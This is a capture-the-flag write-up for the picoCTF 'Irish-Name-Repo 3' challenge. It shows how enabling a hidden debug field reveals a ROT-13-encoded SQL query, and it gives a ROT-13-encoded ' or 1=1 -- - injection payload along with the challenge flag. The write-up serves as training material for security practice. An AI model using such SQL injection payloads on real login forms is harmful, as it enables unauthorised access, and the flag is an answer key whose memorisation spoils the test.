## Irish-Name-Repo 3 (400)

#### Description
> There is a secure website running at https://2019shell1.picoctf.com/problem/12271/ or http://2019shell1.picoctf.com:12271. Try to see if you can login as admin!

#### Hint
> Seems like the password is encrypted.

#### Solution
View-source the login-page, we will see a hidden field name "debug" with the value "0". So we edit it into "1" and send the password "abcdef{}". We got this:

```html
password: abcdef{}
SQL query: SELECT * FROM admin where password = 'nopqrs{}'
```
So, `abcdef{}` -> `nopgrs{}`. That is exactly ROT-13 cipher.
We need payload `' or 1=1 -- -`, so we will inject `' be 1=1 -- -`.

#### Flag
`picoCTF{3v3n_m0r3_SQL_ef7eac2f}`